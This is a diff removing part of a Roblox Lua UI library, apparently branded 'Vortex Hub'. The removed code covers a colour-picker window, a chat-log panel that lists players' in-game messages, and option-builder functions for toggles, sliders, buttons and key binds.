-  		BackgroundColor3 = Color3.fromHSV(hue, 1, 1),
-  		BorderSizePixel = 0,
-  		Image = "rbxassetid://4155801252",
-  		ClipsDescendants = true,
-  		Parent = option.mainHolder
-	})
-	option.satvalSlider = framework:Create("Frame", {
-    Parent = option.satval,
-		ZIndex = 3,
-		AnchorPoint = Vector2.new(0.5, 0.5),
-		Position = UDim2.new(sat, 0, 1 - val, 0),
-		Size = UDim2.new(0, 4, 0, 4),
-		Rotation = 45,
-		BackgroundTransparency = 0,
-		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
-	})
-  option.hue = framework:Create("ImageLabel", {
-    Parent = option.mainHolder,
-    ZIndex = 3,
-    AnchorPoint = Vector2.new(0, 1),
-    Position = UDim2.new(0, 8, 1, -8),
-    Size = UDim2.new(0.973, -100, 0, 22),
-    BackgroundTransparency = 1,
-    Image = "rbxassetid://3570695787",
-    ScaleType = Enum.ScaleType.Slice,
-    SliceCenter = Rect.new(100, 100, 100, 100),
-    SliceScale = 0.02,
-  })
-  local Gradient = framework:Create("UIGradient", {
-    Parent = option.hue,
-    Color = ColorSequence.new({
-      ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
-      ColorSequenceKeypoint.new(0.157, Color3.fromRGB(255, 0, 255)),
-      ColorSequenceKeypoint.new(0.323, Color3.fromRGB(0, 0, 255)),
-      ColorSequenceKeypoint.new(0.488, Color3.fromRGB(0, 255, 255)),
-      ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 255, 0)),
-      ColorSequenceKeypoint.new(0.817, Color3.fromRGB(255, 255, 0)),
-      ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
-    })
-  })
-  option.hueSlider = framework:Create("Frame", {
-    Parent = option.hue,
-    ZIndex = 3,
-    Position = UDim2.new(1 - hue, 0, 0, 0),
-    Size = UDim2.new(0, 2, 1, 0),
-    BackgroundTransparency = 0,
-    BackgroundColor3 = Color3.fromRGB(30, 30, 30),
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-  })
-  option.visualize2 = framework:Create("ImageLabel", {
-    Parent = option.mainHolder,
-    ZIndex = 3,
-    Position = UDim2.new(1.007, -8, -0.005, 8),
-    Size = UDim2.new(0, -80, 0, 80),
-    BackgroundTransparency = 1,
-    Image = "rbxassetid://3570695787",
-    ImageColor3 = currentColor,
-    ScaleType = Enum.ScaleType.Slice,
-    SliceCenter = Rect.new(100, 100, 100, 100),
-    SliceScale = 0.02,
-  })
-
-  local inContactresetColour = false
-  local inContactrainbowColour = false
-  local inContactsetColour = false
-  local inContactundoColour = false
-
-  option.hue.InputBegan:connect(function(Input)
-  		if Input.UserInputType == Enum.UserInputType.MouseButton1 then
-  			editinghue = true
-  			X = (option.hue.AbsolutePosition.X + option.hue.AbsoluteSize.X) - option.hue.AbsolutePosition.X
-  			X = (Input.Position.X - option.hue.AbsolutePosition.X) / X
-  			X = X < 0 and 0 or X > 0.995 and 0.995 or X
-  			option:updateVisuals(Color3.fromHSV(1 - X, sat, val))
-  		end
-	end)
-
-	inputService.InputChanged:connect(function(Input)
-		if Input.UserInputType == Enum.UserInputType.MouseMovement and editinghue then
-			X = (option.hue.AbsolutePosition.X + option.hue.AbsoluteSize.X) - option.hue.AbsolutePosition.X
-			X = (Input.Position.X - option.hue.AbsolutePosition.X) / X
-			X = X <= 0 and 0 or X >= 0.995 and 0.995 or X
-			option:updateVisuals(Color3.fromHSV(1 - X, sat, val))
-		end
-	end)
-
-	option.hue.InputEnded:connect(function(Input)
-		if Input.UserInputType == Enum.UserInputType.MouseButton1 then
-			editinghue = false
-		end
-	end)
-
-  option.satval.InputBegan:connect(function(Input)
-  		if Input.UserInputType == Enum.UserInputType.MouseButton1 then
-  			editingsatval = true
-  			X = (option.satval.AbsolutePosition.X + option.satval.AbsoluteSize.X) - option.satval.AbsolutePosition.X
-  			Y = (option.satval.AbsolutePosition.Y + option.satval.AbsoluteSize.Y) - option.satval.AbsolutePosition.Y
-  			X = (Input.Position.X - option.satval.AbsolutePosition.X) / X
-  			Y = (Input.Position.Y - option.satval.AbsolutePosition.Y) / Y
-  			X = X <= 0.005 and 0.005 or X >= 1 and 1 or X
-  			Y = Y <= 0 and 0 or Y >= 0.995 and 0.995 or Y
-  			option:updateVisuals(Color3.fromHSV(hue, X, 1 - Y))
-  		end
-	end)
-
-	inputService.InputChanged:connect(function(Input)
-		if Input.UserInputType == Enum.UserInputType.MouseMovement and editingsatval then
-			X = (option.satval.AbsolutePosition.X + option.satval.AbsoluteSize.X) - option.satval.AbsolutePosition.X
-			Y = (option.satval.AbsolutePosition.Y + option.satval.AbsoluteSize.Y) - option.satval.AbsolutePosition.Y
-			X = (Input.Position.X - option.satval.AbsolutePosition.X) / X
-			Y = (Input.Position.Y - option.satval.AbsolutePosition.Y) / Y
-			X = X <= 0.005 and 0.005 or X >= 1 and 1 or X
-			Y = Y <= 0 and 0 or Y >= 0.995 and 0.995 or Y
-			option:updateVisuals(Color3.fromHSV(hue, X, 1 - Y))
-		end
-	end)
-
-	option.satval.InputEnded:connect(function(Input)
-		if Input.UserInputType == Enum.UserInputType.MouseButton1 then
-			editingsatval = false
-		end
-	end)
-
-  option.resetColour.InputBegan:connect(function(Input)
-  		if Input.UserInputType == Enum.UserInputType.MouseButton1 and not rainbowEnabled then
-  			previousColors = {originalColor}
-  			option:SetColor(originalColor)
-  		end
-  		if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
-        inContactresetColour = true
-        tweenService:Create(option.resetColor, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
-  		end
-	end)
-
-	option.resetColour.InputEnded:connect(function(Input)
-  		if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
-        inContactresetColour = false
-        tweenService:Create(option.resetColor, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
-  		end
-	end)
-
-  option.undoColour.InputBegan:connect(function(Input)
-      if Input.UserInputType == Enum.UserInputType.MouseButton1 and not rainbowEnabled then
-        local Num = #previousColors == 1 and 0 or 1
-        option:SetColor(previousColors[#previousColors - Num])
-        if #previousColors ~= 1 then
-          table.remove(previousColors, #previousColors)
-        end
-      end
-      if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
-        inContactundoColour = true
-        tweenService:Create(option.undoColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
-      end
-  end)
-
-  option.undoColour.InputEnded:connect(function(Input)
-      if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
-        inContactundoColour = false
-        tweenService:Create(option.undoColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
-      end
-  end)
-
-  option.setColour.InputBegan:connect(function(Input)
-      if Input.UserInputType == Enum.UserInputType.MouseButton1 and not rainbowEnabled then
-        table.insert(previousColors, currentColor)
-        option:SetColor(currentColor)
-      end
-      if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
-        inContactsetColour = true
-        tweenService:Create(option.setColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
-      end
-  end)
-
-  option.setColour.InputEnded:connect(function(Input)
-      if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
-        inContactsetColour = false
-        tweenService:Create(option.setColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
-      end
-  end)
-
-  option.rainbowColour.InputBegan:connect(function(Input)
-    if Input.UserInputType == Enum.UserInputType.MouseButton1 then
-      rainbowEnabled = not rainbowEnabled
-      if rainbowEnabled then
-        rainbowLoop = runService.Heartbeat:connect(function()
-          option:SetColor(chromaColor)
-          option.rainbowColour.TextColor3 = chromaColor
-        end)
-      else
-        rainbowLoop:Disconnect()
-        option:SetColor(previousColors[#previousColors])
-        option.rainbowColour.TextColor3 = Color3.fromRGB(255, 255, 255)
-      end
-    end
-    if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
-      inContactrainbowColour = true
-      tweenService:Create(option.rainbowColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
-    end
-  end)
-
-  option.rainbowColour.InputEnded:connect(function(Input)
-      if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
-        inContactrainbowColour = false
-        tweenService:Create(option.rainbowColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
-      end
-  end)
-
-  option.close.InputBegan:connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      option:Close()
-    elseif input.UserInputType == Enum.UserInputType.MouseMovement then
-      tweenService:Create(option.close, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = framework.menuSettings.secondaryColour}):Play()
-    end
-  end)
-
-  option.close.InputEnded:connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      tweenService:Create(option.close, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-    end
-  end)
-
-  dragify(option.topBar)
-  option.topBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      dragify(option.topBar)
-    end
-  end)
-
-  game:GetService("RunService").RenderStepped:Connect(function()
-    option.topBar.ImageColor3 = framework.menuSettings.mainColour
-    titleName.Font = framework.menuSettings.font
-    titleName.TextColor3 = framework.menuSettings.textColor
-    titleName.TextSize = framework.menuSettings.titleSize
-    option.resetColour.TextSize = framework.menuSettings.textSize
-    option.resetColour.Font = framework.menuSettings.font
-    option.resetColour.TextColor3 = framework.menuSettings.textColor
-    option.rainbowColour.TextSize = framework.menuSettings.textSize
-    option.rainbowColour.Font = framework.menuSettings.font
-    option.rainbowColour.TextColor3 = framework.menuSettings.textColor
-    option.undoColour.TextSize = framework.menuSettings.textSize
-    option.undoColour.Font = framework.menuSettings.font
-    option.undoColour.TextColor3 = framework.menuSettings.textColor
-    option.setColour.TextSize = framework.menuSettings.textSize
-    option.setColour.Font = framework.menuSettings.font
-    option.setColour.TextColor3 = framework.menuSettings.textColor
-    if inContactundoColour == false then
-      option.undoColour.BackgroundColor3 = framework.menuSettings.secondaryColour
-    end
-    if not inContactsetColour == false then
-      option.setColour.BackgroundColor3 = framework.menuSettings.secondaryColour
-    end
-    if inContactrainbowColour == false then
-      option.rainbowColour.BackgroundColor3 = framework.menuSettings.secondaryColour
-    end
-    if inContactresetColour == false then
-      option.resetColour.BackgroundColor3 = framework.menuSettings.secondaryColour
-    end
-  end)
-  return option
-end
-
-local function createColourPicker(option, parent, holder)
-  local mainmainHolder = framework:Create("Frame", {
-    Parent = parent.main,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 163, 0, 33),
-  })
-  option.visualize = framework:Create("ImageLabel", {
-    Parent = mainmainHolder,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 60, 0, 25),
-    Position = UDim2.new(0.816, 0, -0.051, 0),
-    Image = "rbxassetid://3570695787",
-		ImageColor3 = option.color,
-		ScaleType = Enum.ScaleType.Slice,
-		SliceCenter = Rect.new(100, 100, 100, 100),
-		SliceScale = 0.08,
-  })
-  option.main = framework:Create("TextLabel", {
-    Parent = mainmainHolder,
-    BackgroundTransparency = 1,
-    TextSize = 15,
-    Text = option.text,
-    TextColor3 = framework.menuSettings.textColor,
-    Font = framework.menuSettings.font,
-    TextXAlignment = Enum.TextXAlignment.Left,
-    Position = UDim2.new(0.033, 0, -0.04, 0),
-    Size = UDim2.new(0, 129, 0, 25),
-  })
-
-  local inContact
-  option.main.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-  			if not option.topBar then createColourPickerWindow(option) end
-  			if framework.activePopup then
-  				framework.activePopup:Close()
-  			end
-  			option.open = true
-  			option.topBar.Visible = true
-  			framework.activePopup = option
-      elseif input.UserInputType == Enum.UserInputType.MouseMovement then
-        inContact = true
-        option.main.TextColor3 = framework.menuSettings.mainColour
-		end
-  end)
-
-  option.visualize.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        if not option.topBar then createColourPickerWindow(option) end
-        if framework.activePopup then
-          framework.activePopup:Close()
-        end
-        option.open = true
-        option.topBar.Visible = true
-        framework.activePopup = option
-      elseif input.UserInputType == Enum.UserInputType.MouseMovement then
-        inContact = true
-        option.main.TextColor3 = framework.menuSettings.mainColour
-    end
-  end)
-
-  option.main.InputEnded:connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      inContact = false
-        option.main.TextColor3 = framework.menuSettings.secondaryColour
-    end
-  end)
-
-  option.visualize.InputEnded:connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      inContact = false
-        option.main.TextColor3 = framework.menuSettings.secondaryColour
-    end
-  end)
-
-  function option:SetColor(newColor)
-    if option.topBar then
-      option:updateVisuals(newColor)
-    end
-    option.visualize.ImageColor3 = newColor
-    framework.flags[self.flag] = newColor
-    option.color = newColor
-    option.callback(newColor)
-  end
-
-  function option:Close()
-    framework.activePopup = nil
-    self.open = false
-    option.topBar.Visible = false
-  end
-
-  game:GetService("RunService").RenderStepped:Connect(function()
-    --local position = option.main.AbsolutePosition
-    --option.topBar.Position = UDim2.new(0, position.X+510, 0, position.Y + 35)
-    option.main.Font = framework.menuSettings.font
-    option.main.TextColor3 = framework.menuSettings.textColor
-  end)
-end
-
-function framework:createChatLoggerWindow()
-  if framework.base:FindFirstChild("エブリ") then
-    return
-  end
-  local holder = framework:Create("ImageLabel", {
-    Parent = framework.base,
-    Name = "エブリ",
-    BackgroundTransparency = 1,
-    Position = UDim2.new(0, 0, 0, 0),
-    Size = UDim2.new(0, 350, 0, 30),
-    Image = "rbxassetid://3570695787",
-    ImageColor3 = framework.menuSettings.mainColour,
-    ScaleType = Enum.ScaleType.Slice,
-    SliceScale = 0.05,
-    SliceCenter = Rect.new(100, 100, 100, 100)
-  })
-  local mainHolder = framework:Create("ImageLabel", {
-    Parent = holder,
-    BackgroundTransparency = 1,
-    Position = UDim2.new(-0, 0, 0.639, 0),
-    Size = UDim2.new(0, 350, 0, 223),
-    Image = "rbxassetid://3570695787",
-    ImageColor3 = Color3.fromRGB(15, 15, 15),
-    ScaleType = Enum.ScaleType.Slice,
-    SliceScale = 0.03,
-    SliceCenter = Rect.new(100, 100, 100, 100)
-  })
-  local title = framework:Create("TextLabel", {
-    Parent = holder,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 350, 0, 19),
-    Position = UDim2.new(0, 0, 0, 0),
-    Text = "Vortex Hub Chatlogs",
-    Font = framework.menuSettings.font,
-    TextColor3 = framework.menuSettings.textColor,
-    TextSize = framework.menuSettings.titleSize
-  })
-  local connector = framework:Create("Frame", {
-    Parent = mainHolder,
-    BackgroundColor3 = Color3.fromRGB(15, 15, 15),
-    BorderSizePixel = 0,
-    Position = UDim2.new(-0, 0, -0.002, 0),
-    Size = UDim2.new(0, 350, 0, 22)
-  })
-  local mainFrame = framework:Create("ScrollingFrame", {
-    Parent = mainHolder,
-    BackgroundColor3 = Color3.fromRGB(20, 20, 20),
-    BorderColor3 = framework.menuSettings.mainColour,
-    BorderSizePixel = 2,
-    Position = UDim2.new(0.032, 0, 0.036, 0),
-    Size = UDim2.new(0, 318, 0, 168),
-    ScrollBarImageColor3 = framework.menuSettings.mainColour,
-    ScrollBarThickness = 5,
-    CanvasSize = UDim2.new(0, 0, 0, 0)
-  })
-  local layout = framework:Create("UIListLayout", {
-    Parent = mainFrame
-  })
-  local clear = framework:Create("TextLabel", {
-    Parent = mainHolder,
-    Position = UDim2.new(0.37, 0, 0.845, 0),
-    Size = UDim2.new(0, 70, 0, 18),
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    Text = "Clear",
-    Font = framework.menuSettings.font,
-    TextSize = framework.menuSettings.textSize,
-    TextColor3 = framework.menuSettings.textColor
-  })
-  local save = framework:Create("TextLabel", {
-    Parent = mainHolder,
-    Position = UDim2.new(0.622, 0, 0.845, 0),
-    Size = UDim2.new(0, 70, 0, 18),
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    Text = "Save",
-    Font = framework.menuSettings.font,
-    TextSize = framework.menuSettings.textSize,
-    TextColor3 = framework.menuSettings.textColor
-  })
-  local toggleHolder = framework:Create("Frame", {
-    Parent = mainHolder,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 163, 0, 25),
-    Position = UDim2.new(0.02, 0, 0.835, 0)
-  })
-  local checkBoxHolder = framework:Create("Frame", {
-    Parent = toggleHolder,
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    BorderSizePixel = 1,
-    Size = UDim2.new(0, 20, 0, 20),
-    Position = UDim2.new(0.037, 0, 0.08, 0),
-  })
-  local checkmark = framework:Create("ImageLabel", {
-    Parent = toggleHolder,
-    BackgroundTransparency = 1,
-    Visible = true,
-    Image = "http://www.roblox.com/asset/?id=5226924982",
-    ImageColor3 = framework.menuSettings.mainColour,
-    ScaleType = Enum.ScaleType.Stretch,
-    Position = UDim2.new(0, 6, 0, 5),
-    Size = UDim2.new(0, 20, 0, 20)
-  })
-  local logging = framework:Create("TextLabel", {
-    Parent = toggleHolder,
-    BackgroundTransparency = 1,
-    TextSize = 15,
-    Text = "Logging",
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    Font = framework.menuSettings.font,
-    TextXAlignment = Enum.TextXAlignment.Left,
-    Position = UDim2.new(0.241, 0, -0.04, 0),
-    Size = UDim2.new(0, 129, 0, 25)
-  })
-  local close = framework:Create("TextLabel", {
-    Parent = holder,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 20, 0, 20),
-    Position = UDim2.new(0.94, 0, -0.067, 0),
-    Text = "X",
-    Font = framework.menuSettings.font,
-    TextColor3 = framework.menuSettings.textColor,
-    TextSize = framework.menuSettings.titleSize
-  })
-  dragify(holder)
-  local inContactclear = false
-  local inContactsave = false
-  close.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      holder:Destroy()
-      dragify(self.base.holder)
-    elseif input.UserInputType == Enum.UserInputType.MouseMovement then
-      close.TextColor3 = framework.menuSettings.secondaryColour
-    end
-  end)
-  close.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      close.TextColor3 = Color3.fromRGB(255, 255, 255)
-    end
-  end)
-  clear.InputBegan:Connect(function(input)
-    inContactclear = true
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      for i,v in pairs(mainFrame:GetChildren()) do
-        if v:IsA("TextLabel") then
-          v:Destroy()
-        end
-      end
-      mainFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-      mainFrame.CanvasPosition = Vector2.new(0, 0)
-    elseif input.UserInputType == Enum.UserInputType.MouseMovement then
-      clear.BackgroundColor3 = framework.menuSettings.mainColour
-    end
-  end)
-  clear.InputEnded:Connect(function(input)
-    inContactclear = false
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      clear.BackgroundColor3 = framework.menuSettings.secondaryColour
-    end
-  end)
-  save.InputBegan:Connect(function(input)
-    inContactsave = true
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-
-    elseif input.UserInputType == Enum.UserInputType.MouseMovement then
-      save.BackgroundColor3 = framework.menuSettings.mainColour
-    end
-  end)
-  save.InputEnded:Connect(function(input)
-    inContactsave = false
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      save.BackgroundColor3 = framework.menuSettings.secondaryColour
-    end
-  end)
-  holder.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      dragify(holder)
-    end
-  end)
-  checkBoxHolder.InputBegan:Connect(function(input)
-    inContactcheckBox = true
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      framework.flags.chatLogs = not framework.flags.chatLogs
-      checkmark.Visible = framework.flags.chatLogs
-    elseif input.UserInputType == Enum.UserInputType.MouseMovement then
-      logging.TextColor3 = framework.menuSettings.mainColour
-      checkBoxHolder.BorderColor3 = framework.menuSettings.mainColour
-    end
-  end)
-  checkBoxHolder.InputEnded:Connect(function(input)
-    inContactcheckBox = false
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      logging.TextColor3 = framework.menuSettings.textColor
-      checkBoxHolder.BorderColor3 = Color3.fromRGB(255, 255, 255)
-    end
-  end)
-  logging.InputBegan:Connect(function(input)
-    inContactcheckBox = true
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      framework.flags.chatLogs = not framework.flags.chatLogs
-      checkmark.Visible = framework.flags.chatLogs
-    elseif input.UserInputType == Enum.UserInputType.MouseMovement then
-      logging.TextColor3 = framework.menuSettings.mainColour
-      checkBoxHolder.BorderColor3 = framework.menuSettings.mainColour
-    end
-  end)
-  logging.InputEnded:Connect(function(input)
-    inContactcheckBox = false
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      logging.TextColor3 = framework.menuSettings.textColor
-      checkBoxHolder.BorderColor3 = Color3.fromRGB(255, 255, 255)
-    end
-  end)
-  checkmark.InputBegan:Connect(function(input)
-    inContactcheckBox = true
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      framework.flags.chatLogs = not framework.flags.chatLogs
-      checkmark.Visible = framework.flags.chatLogs
-    elseif input.UserInputType == Enum.UserInputType.MouseMovement then
-      logging.TextColor3 = framework.menuSettings.mainColour
-      checkBoxHolder.BorderColor3 = framework.menuSettings.mainColour
-    end
-  end)
-  checkmark.InputEnded:Connect(function(input)
-    inContactcheckBox = false
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      logging.TextColor3 = framework.menuSettings.textColor
-      checkBoxHolder.BorderColor3 = Color3.fromRGB(255, 255, 255)
-    end
-  end)
-  local lastMessage = nil
-  local lastLabel = nil
-  local dupeCount = 1
-  local function createLogLabel(name, txt)
-    if lastMessage == name..txt then
-      dupeCount = dupeCount+1
-      lastLabel.Text = Time().." ["..name.."]; "..txt.." (x"..dupeCount..")"
-    else
-      if dupeCount > 1 then dupeCount = 1 end
-      if #mainFrame:GetChildren() >= 2540 then
-        for i,v in pairs(mainFrame:GetChildren()) do
-          if v:IsA("TextLabel") then
-            v:Destroy()
-          end
-        end
-      end
-      local alls = 0
-      for i,v in pairs(mainFrame:GetChildren()) do
-        if v:IsA("TextLabel") then
-          alls = v.Size.Y.Offset + alls
-        else
-          alls = 0
-        end
-      end
-      local textLabel = framework:Create("TextLabel", {
-        Parent = mainFrame,
-        Font = framework.menuSettings.font,
-        BackgroundTransparency = 1,
-        Text = Time().." ["..name.."]; "..txt,
-        TextSize = framework.menuSettings.textSize,
-        TextColor3 = framework.menuSettings.textColor,
-        Size = UDim2.new(0, 310, 0, 35),
-        TextXAlignment = Enum.TextXAlignment.Left,
-        TextYAlignment = Enum.TextYAlignment.Top,
-        TextWrapped = true
-      })
-      textLabel.Size = UDim2.new(0, 310, 0, textLabel.TextBounds.Y)
-      mainFrame.CanvasSize = UDim2.new(0, 0, 0, alls+textLabel.TextBounds.Y)
-      mainFrame.CanvasPosition = Vector2.new(0, mainFrame.CanvasPosition.Y+textLabel.TextBounds.Y+20)
-    end
-  end
-  local function chatLog(plr)
-    plr.Chatted:Connect(function(msg)
-      if framework.flags["chatLogs"] then
-        createLogLabel(plr.Name, msg)
-      end
     end)
   end
-  for _, plr in pairs(game.Players:GetChildren()) do
-  	if plr.ClassName == "Player" then
-  		chatLog(plr)
-  	end
-  end
-  game.Players.PlayerAdded:Connect(function(plr)
-    chatLog(plr)
-  end)
-  game:GetService("RunService").RenderStepped:Connect(function()
-    holder.ImageColor3 = framework.menuSettings.mainColour
-    title.TextSize = framework.menuSettings.textSize
-    logging.TextSize = framework.menuSettings.textSize
-    logging.TextColor3 = framework.menuSettings.textColor
-    title.TextColor3 = framework.menuSettings.textColor
-    save.TextSize = framework.menuSettings.textSize
-    save.TextColor3 = framework.menuSettings.textColor
-    clear.TextSize = framework.menuSettings.textSize
-    clear.TextColor3 = framework.menuSettings.textColor
-    mainFrame.BorderColor3 = framework.menuSettings.mainColour
-    mainFrame.ScrollBarImageColor3 = framework.menuSettings.mainColour
-    checkBoxHolder.BackgroundColor3 = framework.menuSettings.secondaryColour
-    checkmark.ImageColor3 = framework.menuSettings.mainColour
-    logging.TextColor3 = framework.menuSettings.textColor
-    logging.TextSize = framework.menuSettings.textSize
-    if not inContactclear then
-      clear.BackgroundColor3 = framework.menuSettings.secondaryColour
-    end
-    if not inContactsave then
-      save.BackgroundColor3 = framework.menuSettings.secondaryColour
-    end
-  end)
-end
-
-local function loadOptions(option, holder)
-  for _,newOption in next, option.options do
-    if newOption.type == "toggle" then
-      createToggle(newOption, option)
-    elseif newOption.type == "button" then
-			createButton(newOption, option)
-    elseif newOption.type == "setcolor" then
-      createColorSetButton(newOption, option)
-    elseif newOption.type == "label" then
-			createLabel(newOption, option)
-    elseif newOption.type == "textbox" then
-			createTextBox(newOption, option)
-    elseif newOption.type == "bind" then
-			createBind(newOption, option)
-    elseif newOption.type == "slider" then
-      createSlider(newOption, option)
-    elseif newOption.type == "folder" then
-      newOption:init()
-    elseif newOption.type == "horizontalalignment" then
-      newOption:init()
-    elseif newOption.type == "color" then
-      createColourPicker(newOption, option, holder)
-    end
-  end
-end
-
-local function getFunctions(parent)
-  function parent:AddToggle(option)
-  		option = typeof(option) == "table" and option or {}
-  		option.text = tostring(option.text)
-  		option.state = typeof(option.state) == "boolean" and option.state or false
-  		option.callback = typeof(option.callback) == "function" and option.callback or function() end
-  		option.type = "toggle"
-  		option.position = #self.options
-  		option.flag = option.flag or option.text
-  		framework.flags[option.flag] = option.state
-  		table.insert(self.options, option)
-
-  		return option
-	end
-
-  function parent:AddButton(option)
-    option = typeof(option) == "table" and option or {}
-    option.text = tostring(option.text)
-    option.callback = typeof(option.callback) == "function" and option.callback or function() end
-    option.type = "button"
-    option.position = #self.options
-    option.flag = option.flag or option.text
-    table.insert(self.options, option)
-
-    return option
-  end
-
-  function parent:AddColor(option)
-    option = typeof(option) == "table" and option or {}
-    option.text = tostring(option.text)
-    option.type = "setcolor"
-    option.position = #self.options
-    option.flag = option.flag or option.text
-    table.insert(self.options, option)
-
-    return option
-  end
-
-  function parent:AddLabel(option)
-  		option = typeof(option) == "table" and option or {}
-  		option.text = tostring(option.text)
-  		option.type = "label"
-  		option.position = #self.options
-  		table.insert(self.options, option)
-
-  		return option
-  end
-
-  function parent:AddTextbox(option)
-    option = typeof(option) == "table" and option or {}
-    option.text = tostring(option.text)
-    option.value = tostring(option.value or "")
-    option.callback = typeof(option.callback) == "function" and option.callback or function() end
-    option.type = "textbox"
-    option.position = #self.options
-    option.flag = option.flag or option.text
-    framework.flags[option.flag] = option.value
-    table.insert(self.options, option)
-
-    return option
-  end
-
-  function parent:AddBind(option)
-  		option = typeof(option) == "table" and option or {}
-  		option.text = tostring(option.text)
-  		option.key = (option.key and option.key.Name) or option.key or "F"
-  		option.hold = typeof(option.hold) == "boolean" and option.hold or false
-  		option.callback = typeof(option.callback) == "function" and option.callback or function() end
-  		option.type = "bind"
-  		option.position = #self.options
-  		option.flag = option.flag or option.text
-  		framework.flags[option.flag] = option.key
-  		table.insert(self.options, option)
-
-  		return option
-	end
-
-  function parent:AddSlider(option)
-    option = typeof(option) == "table" and option or {}
-    option.text = tostring(option.text)
-    option.min = typeof(option.min) == "number" and option.min or 0
-    option.max = typeof(option.max) == "number" and option.max or 0
-    option.dual = typeof(option.dual) == "boolean" and option.dual or false
-    option.value = math.clamp(typeof(option.value) == "number" and option.value or option.min, option.min, option.max)
-    option.value2 = typeof(option.value2) == "number" and option.value2 or option.max
-    option.callback = typeof(option.callback) == "function" and option.callback or function() end
-    option.float = typeof(option.value) == "number" and option.float or 1
-    option.type = "slider"
-    option.position = #self.options
-    option.flag = option.flag or option.text
-    framework.flags[option.flag] = option.value
-    table.insert(self.options, option)
-
-    return option
-  end
-
-  function parent:AddFolder(title)
-  		local option = {}
-  		option.title = tostring(title)
-  		option.options = {}
-  		option.open = false
-  		option.type = "folder"
-  		option.position = #self.options
-  		table.insert(self.options, option)
-
-  		getFunctions(option)
-
-  		function option:init()
-  			createFolder(self.title, parent.main, self, true)
-  			loadOptions(self, parent)
-  		end
-
-  		return option
-  end
-
-  function parent:AddHorizontalAlignment()
-  		local option = {}
-  		option.options = {}
-  		option.open = false
-  		option.type = "horizontalalignment"
-  		option.position = #self.options
-  		table.insert(self.options, option)
-
-  		getFunctions(option)
-
-  		function option:init()
-  			createHorizontalAlignment(parent.main, self, true)
-  			loadOptions(self, parent)
-  		end
-
-  		return option
-  end
-
-  function parent:AddColorPicker(option)
-    option = typeof(option) == "table" and option or {}
-    option.text = tostring(option.text)
-    option.color = typeof(option.color) == "table" and Color3.new(tonumber(option.color[1]), tonumber(option.color[2]), tonumber(option.color[3])) or option.color or Color3.new(255, 255, 255)
-    option.callback = typeof(option.callback) == "function" and option.callback or function() end
